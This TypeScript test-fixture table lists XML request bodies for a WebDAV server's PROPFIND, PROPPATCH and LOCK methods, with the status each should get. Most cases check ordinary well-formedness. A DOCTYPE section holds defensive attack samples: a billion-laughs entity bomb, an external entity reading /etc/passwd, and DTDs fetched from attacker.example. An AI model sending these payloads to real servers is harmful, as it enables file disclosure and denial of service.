// XML request bodies for PROPFIND, PROPPATCH and LOCK (PRD §11, §12). Each body is the method's
// valid document changed in one way. The oracle comes from XML 1.0 and Namespaces in XML (what is
// well-formed), RFC 4918 §17 (unknown elements are ignored, the root must be the method's DAV:
// element) and PRD §12 (no document type declarations, limits on size and complexity): a
// well-formed, valid body succeeds, anything else is refused with 400, or 413 when it is too big,
// and a refused body changes nothing. xml-bodies.test.ts runs the table in process, and
// tests/integration/compat/http/protocol-tables.test.ts over HTTP against real servers.

export type Method = "PROPFIND" | "PROPPATCH" | "LOCK";

interface Document {
  readonly root: string;
  readonly inner: string;
  /** The status of the method when the body is valid. */
  readonly success: number;
}

export const DOCUMENTS: Readonly<Record<Method, Document>> = {
  PROPFIND: { root: "propfind", inner: "<D:prop><D:getetag/></D:prop>", success: 207 },
  PROPPATCH: {
    root: "propertyupdate",
    inner: '<D:set><D:prop><Z:note xmlns:Z="urn:z">v</Z:note></D:prop></D:set>',
    success: 207,
  },
  LOCK: {
    root: "lockinfo",
    inner: "<D:lockscope><D:exclusive/></D:lockscope><D:locktype><D:write/></D:locktype>",
    success: 200,
  },
};

const DECL = '<?xml version="1.0" encoding="utf-8"?>';

const wrap = ({ root, inner }: Document, extra = "") =>
  `<D:${root} xmlns:D="DAV:">${extra}${inner}</D:${root}>`;

const nest = (depth: number) => `${'<X:n xmlns:X="urn:x">'.repeat(depth)}${"</X:n>".repeat(depth)}`;

/** Another method's root, so each method gets a well-formed body with the wrong root. */
const OTHER: Readonly<Record<Method, Method>> = {
  PROPFIND: "LOCK",
  PROPPATCH: "PROPFIND",
  LOCK: "PROPPATCH",
};

type Verdict = "valid" | "malformed" | "too big";

interface Body {
  readonly label: string;
  readonly verdict: Verdict;
  readonly build: (doc: Document, method: Method) => string;
}

export const BODIES: readonly Body[] = [
  // Well-formed and valid.
  { label: "the canonical document", verdict: "valid", build: (d) => DECL + wrap(d) },
  { label: "no XML declaration", verdict: "valid", build: (d) => wrap(d) },
  { label: "whitespace before the root", verdict: "valid", build: (d) => `\n  \t${wrap(d)}` },
  { label: "a byte order mark", verdict: "valid", build: (d) => `\uFEFF${DECL}${wrap(d)}` },
  {
    label: "a comment before the root",
    verdict: "valid",
    build: (d) => `${DECL}<!-- c -->${wrap(d)}`,
  },
  { label: "a comment inside the root", verdict: "valid", build: (d) => wrap(d, "<!-- c -->") },
  {
    label: "a processing instruction after the root",
    verdict: "valid",
    build: (d) => `${wrap(d)}<?app x?>`,
  },
  {
    label: "another prefix for DAV:",
    verdict: "valid",
    build: (d) =>
      wrap(d)
        .replace(/<(\/?)D:/g, "<$1a:")
        .replace("xmlns:D=", "xmlns:a="),
  },
  {
    label: "DAV: as the default namespace",
    verdict: "valid",
    build: (d) =>
      wrap(d)
        .replace(/<(\/?)D:/g, "<$1")
        .replace("xmlns:D=", "xmlns="),
  },
  {
    label: "single-quoted namespace",
    verdict: "valid",
    build: (d) => wrap(d).replace('"DAV:"', "'DAV:'"),
  },
  {
    label: "an unknown DAV: element",
    verdict: "valid",
    build: (d) => wrap(d, "<D:unknown-extension/>"),
  },
  {
    label: "an unknown element in another namespace",
    verdict: "valid",
    build: (d) => wrap(d, '<X:ext xmlns:X="urn:x"><X:deep/></X:ext>'),
  },
  {
    label: "unknown attributes",
    verdict: "valid",
    build: (d) => wrap(d).replace('xmlns:D="DAV:"', 'xmlns:D="DAV:" extra="1" xml:lang="en"'),
  },
  {
    label: "a CDATA section of whitespace",
    verdict: "valid",
    build: (d) => wrap(d, "<![CDATA[ ]]>"),
  },
  { label: "whitespace after the root", verdict: "valid", build: (d) => `${wrap(d)}\n\n` },
  {
    label: "upper-case encoding and standalone",
    verdict: "valid",
    build: (d) => `<?xml version="1.0" encoding="UTF-8" standalone="yes"?>${wrap(d)}`,
  },
  { label: "nesting 32 levels deep", verdict: "valid", build: (d) => wrap(d, nest(32)) },
  {
    label: "1,000 unknown siblings",
    verdict: "valid",
    build: (d) => wrap(d, '<X:s xmlns:X="urn:x"/>'.repeat(1000)),
  },
  {
    label: "character and predefined entity references",
    verdict: "valid",
    build: (d) => wrap(d, '<X:t xmlns:X="urn:x">&#65;&#x42;&amp;&lt;&gt;&quot;&apos;</X:t>'),
  },
  {
    label: "the namespace declared on every element",
    verdict: "valid",
    build: (d) => wrap(d).replace(/<D:(\w[\w-]*)(\/?)>/g, '<D:$1 xmlns:D="DAV:"$2>'),
  },
  // Not well-formed (XML 1.0, Namespaces in XML).
  { label: "a declaration and no root", verdict: "malformed", build: () => DECL },
  {
    label: "a body cut short by one character",
    verdict: "malformed",
    build: (d) => wrap(d).slice(0, -1),
  },
  {
    label: "a body cut in half",
    verdict: "malformed",
    build: (d) => wrap(d).slice(0, Math.floor(wrap(d).length / 2)),
  },
  {
    label: "a mismatched end tag",
    verdict: "malformed",
    build: (d) => wrap(d).replace(new RegExp(`</D:${d.root}>$`), "</D:other>"),
  },
  {
    label: "an unclosed root",
    verdict: "malformed",
    build: (d) => wrap(d).replace(new RegExp(`</D:${d.root}>$`), ""),
  },
  { label: "two root elements", verdict: "malformed", build: (d) => wrap(d) + wrap(d) },
  { label: "text before the root", verdict: "malformed", build: (d) => `junk${wrap(d)}` },
  {
    label: "whitespace before the declaration",
    verdict: "malformed",
    build: (d) => ` ${DECL}${wrap(d)}`,
  },
  { label: "a declaration after the start", verdict: "malformed", build: (d) => wrap(d, DECL) },
  {
    label: "an undeclared prefix",
    verdict: "malformed",
    build: (d) => wrap(d).replace(' xmlns:D="DAV:"', ""),
  },
  { label: "an undefined entity", verdict: "malformed", build: (d) => wrap(d, "&undefined;") },
  { label: "a character reference to NUL", verdict: "malformed", build: (d) => wrap(d, "&#0;") },
  { label: "a raw control character", verdict: "malformed", build: (d) => wrap(d, "\u0001") },
  {
    label: "a raw < in an attribute",
    verdict: "malformed",
    build: (d) => wrap(d, '<X:a xmlns:X="urn:x" v="<"/>'),
  },
  {
    label: "an unquoted attribute",
    verdict: "malformed",
    build: (d) => wrap(d, '<X:a xmlns:X="urn:x" v=1/>'),
  },
  {
    label: "a duplicate attribute",
    verdict: "malformed",
    build: (d) => wrap(d, '<X:a xmlns:X="urn:x" v="1" v="2"/>'),
  },
  { label: "a name starting with a digit", verdict: "malformed", build: (d) => wrap(d, "<1bad/>") },
  {
    label: "an unterminated CDATA section",
    verdict: "malformed",
    build: (d) => wrap(d, "<![CDATA[ x"),
  },
  { label: "an unterminated comment", verdict: "malformed", build: (d) => wrap(d, "<!-- x") },
  {
    label: "a double hyphen in a comment",
    verdict: "malformed",
    build: (d) => wrap(d, "<!-- a -- b -->"),
  },
  // Document type declarations: refused outright (PRD §12), whatever they hold.
  { label: "a bare DOCTYPE", verdict: "malformed", build: (d) => `<!DOCTYPE ${d.root}>${wrap(d)}` },
  {
    label: "an internal entity",
    verdict: "malformed",
    build: (d) => `<!DOCTYPE x [<!ENTITY e "boom">]>${wrap(d, "&e;")}`,
  },
  {
    label: "billion laughs",
    verdict: "malformed",
    build: (d) =>
      `<!DOCTYPE x [<!ENTITY a "lol">${Array.from(
        { length: 9 },
        (_, i) =>
          `<!ENTITY ${"b".repeat(i + 1)} "${(i === 0 ? "&a;" : `&${"b".repeat(i)};`).repeat(10)}">`,
      ).join("")}]>${wrap(d, `&${"b".repeat(9)};`)}`,
  },
  {
    label: "an external entity",
    verdict: "malformed",
    build: (d) => `<!DOCTYPE x [<!ENTITY e SYSTEM "file:///etc/passwd">]>${wrap(d, "&e;")}`,
  },
  {
    label: "an external parameter entity",
    verdict: "malformed",
    build: (d) =>
      `<!DOCTYPE x [<!ENTITY % p SYSTEM "http://attacker.example/x.dtd"> %p;]>${wrap(d)}`,
  },
  {
    label: "an external DTD",
    verdict: "malformed",
    build: (d) => `<!DOCTYPE x SYSTEM "http://attacker.example/x.dtd">${wrap(d)}`,
  },
  // Well-formed, but not the method's document (RFC 4918 §14).
  {
    label: "a root without a namespace",
    verdict: "malformed",
    build: (d) => wrap(d).replace(/<(\/?)D:/g, "<$1"),
  },
  {
    label: "a root in the namespace DAV",
    verdict: "malformed",
    build: (d) => wrap(d).replace('"DAV:"', '"DAV"'),
  },
  {
    label: "a root in the namespace dav:",
    verdict: "malformed",
    build: (d) => wrap(d).replace('"DAV:"', '"dav:"'),
  },
  {
    label: "a root with the wrong name",
    verdict: "malformed",
    build: (d) => wrap({ ...d, root: `${d.root}x` }),
  },
  {
    label: "another method's document",
    verdict: "malformed",
    build: (_, method) => DECL + wrap(DOCUMENTS[OTHER[method]]),
  },
  // Beyond the limits of PRD §12.
  { label: "nesting 5,000 levels deep", verdict: "malformed", build: (d) => wrap(d, nest(5000)) },
  {
    label: "100,000 elements",
    verdict: "malformed",
    build: (d) => wrap(d, "<D:x/>".repeat(100_000)),
  },
  {
    label: "2 MiB of whitespace",
    verdict: "too big",
    build: (d) => wrap(d, " ".repeat(2 * 1024 * 1024)),
  },
  {
    label: "a 2 MiB text node",
    verdict: "too big",
    build: (d) => wrap(d, `<X:t xmlns:X="urn:x">${"a".repeat(2 * 1024 * 1024)}</X:t>`),
  },
];

export const STATUS: Readonly<Record<Exclude<Verdict, "valid">, number[]>> = {
  malformed: [400],
  "too big": [413, 400],
};

export const TABLE = (["PROPFIND", "PROPPATCH", "LOCK"] as const).flatMap((method) =>
  BODIES.map((body) => [method, body.label, body] as const),
);

/**
 * RFC 4918 §9.1: no body is allprop; PROPPATCH needs one; LOCK without one is a refresh, which needs
 * an If header naming the lock. Each method's answer to an empty body and to one of whitespace.
 */
export const EMPTY: readonly (readonly [method: Method, status: number])[] = [
  ["PROPFIND", 207],
  ["PROPPATCH", 400],
  ["LOCK", 400],
];

/** The bodies EMPTY sends. */
export const EMPTY_BODIES: readonly string[] = ["", " \r\n\t"];
